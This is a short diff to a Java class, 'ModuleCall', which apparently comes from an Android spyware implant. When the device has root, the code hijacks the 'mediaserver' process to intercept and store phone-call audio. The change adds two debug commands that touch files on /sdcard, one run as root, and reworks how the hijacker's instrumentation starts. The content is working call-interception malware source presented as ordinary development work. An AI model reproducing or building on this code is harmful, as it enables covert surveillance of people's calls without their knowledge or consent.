@@ -166,6 +166,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Status.haveRoot() && audioStorageOk) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): starting audio storage management");
+				Execute.execute(new String[]{"touch", "/sdcard/1"});
+				Execute.executeRoot("touch /sdcard/2");
 			}
 
 			if (installHijack()) {
@@ -234,12 +236,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		hijack = new Instrument(M.e("mediaserver"), AudioEncoder.getAudioStorage());
 
-		if (hijack.installHijacker()) {
+		if (hijack.startInstrumentation()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker successfully installed");
 			}
 
-			hijack.startInstrumentation();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(actualStart): hijacker cannot be installed");
